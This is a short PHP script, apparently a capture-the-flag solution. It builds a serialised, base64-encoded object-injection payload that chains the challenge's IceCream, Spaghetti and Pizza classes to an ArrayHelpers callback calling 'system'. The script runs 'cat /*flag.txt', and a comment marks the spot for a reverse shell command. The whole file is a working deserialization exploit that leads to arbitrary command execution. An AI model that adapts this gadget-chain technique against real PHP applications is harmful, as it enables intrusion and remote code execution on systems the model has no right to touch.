
<?php

require_once 'challenge/Helpers/CheckAuthentication.php';
require_once 'challenge/Helpers/ArrayHelpers.php';
require_once 'challenge/Models/IceCreamModel.php';
require_once 'challenge/Models/PizzaModel.php';
require_once 'challenge/Models/SpaghettiModel.php';
require_once 'challenge/Models/DatabaseModel.php';

use Helpers\ArrayHelpers;
$arrayHelpers =   new ArrayHelpers(); 
// $arrayHelpers->callback = ["system", "cat /*flag.txt"];
$arrayHelpers->callback = "system";
$arrayHelpers->append("cat /*flag.txt");  // Reverse shell command here
var_dump($arrayHelpers->callback);

print_r($arrayHelpers->callback);
$ice = new IceCream();
$ice->flavors = $arrayHelpers;

$spa = new Spaghetti();
$spa->sauce = $ice;

$pizza = new Pizza();
$pizza->size = $spa;

$b64 = base64_encode(serialize($pizza));

echo $b64;

?>